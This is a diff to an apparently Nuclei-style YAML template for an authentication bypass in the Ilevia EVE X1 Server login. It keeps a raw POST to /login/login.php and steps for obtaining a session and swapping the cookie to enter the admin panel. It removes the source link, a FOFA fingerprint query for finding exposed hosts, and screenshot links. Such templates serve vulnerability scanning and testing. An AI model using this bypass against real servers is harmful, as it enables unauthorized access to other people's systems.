@@ -3,12 +3,8 @@ info:
   name: Ilevia EVE X1 Server login 存在身份认证绕过漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qdl3xu5t66mepo3o'
+  description: ''
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qdl3xu5t66mepo3o
-    fofa: icon_hash="392278119"
 http:
 - raw:
   - 'POST /login/login.php HTTP/1.1
@@ -24,15 +20,7 @@ http:
     获取合法session
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547087169-e8b5415b-dcf2-41d7-a02b-9ef5a40210e9.png)
-
-
-    替换cookie，登录后台
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547087466-2994947e-4b91-4455-8dbe-7a4aa7e27935.png)
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547087752-44ff12d2-23f0-4ee3-9dca-007910c4ddbe.png)'
+    替换cookie，登录后台'
   redirects: false
   matchers:
   - status:
